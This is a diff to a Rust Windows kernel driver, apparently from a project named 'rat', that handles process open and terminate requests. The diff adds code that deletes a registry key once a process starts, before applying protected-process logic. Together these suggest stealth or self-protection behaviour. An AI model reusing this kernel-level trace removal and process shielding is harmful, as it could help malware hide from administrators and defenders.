@@ -2,20 +2,21 @@ use core::sync::atomic::{AtomicPtr, Ordering};
 use core::{mem, ptr, slice};
 
 use rat_common::utils::DropGuard;
-use rat_common::windows::{IOCTL_OPEN_PROCESS, IOCTL_START_DEFENSE, IOCTL_TERMINATE};
+use rat_common::windows::{IOCTL_OPEN_PROCESS, IOCTL_PROCESS_STARTED, IOCTL_TERMINATE};
 use wdk::nt_success;
 use wdk_sys::ntddk::{
     IoCreateDevice, IoCreateSymbolicLink, IoGetCurrentProcess, IofCompleteRequest,
-    PsGetCurrentProcessId, RtlInitUnicodeString, ZwClose, ZwTerminateProcess,
+    PsGetCurrentProcessId, RtlInitUnicodeString, ZwClose, ZwDeleteKey, ZwOpenKey,
+    ZwTerminateProcess,
 };
 use wdk_sys::{
-    DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
+    DELETE, DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
     FILE_DEVICE_UNKNOWN, HANDLE, IO_NO_INCREMENT, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL,
     NTSTATUS, OBJ_KERNEL_HANDLE, PDEVICE_OBJECT, PDRIVER_OBJECT, PIRP, STATUS_INVALID_PARAMETER,
     STATUS_SUCCESS, STATUS_UNSUCCESSFUL, UNICODE_STRING,
 };
 
-use crate::global::{DEVICE_NAME, DOS_NAME};
+use crate::global::{DEVICE_NAME, DOS_NAME, registry_key_attributes};
 use crate::initialize::cleanup::cleanup_device;
 use crate::state::DRIVER_STATE;
 use crate::utils::{match_process_name, open_process_full_access};
@@ -155,7 +156,23 @@ fn device_control_notify(
             }
 
             match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
-                IOCTL_START_DEFENSE => {
+                IOCTL_PROCESS_STARTED => {
+                    let mut name = UNICODE_STRING::default();
+                    let mut attributes = registry_key_attributes(&mut name);
+                    let mut key = HANDLE::default();
+                    let status = unsafe { ZwOpenKey(&mut key, DELETE, &mut attributes) };
+                    if !nt_success(status) {
+                        error!("ZwOpenKey error: 0x{status:X}");
+                        return status;
+                    }
+
+                    let status = unsafe { ZwDeleteKey(key) };
+                    if !nt_success(status) {
+                        error!("ZwDeleteKey error: 0x{status:X}");
+                        return status;
+                    }
+
+                    info!("Removed registry key");
                     let pid = unsafe { PsGetCurrentProcessId() };
 
                     let protected_pids = state.protected_pids();
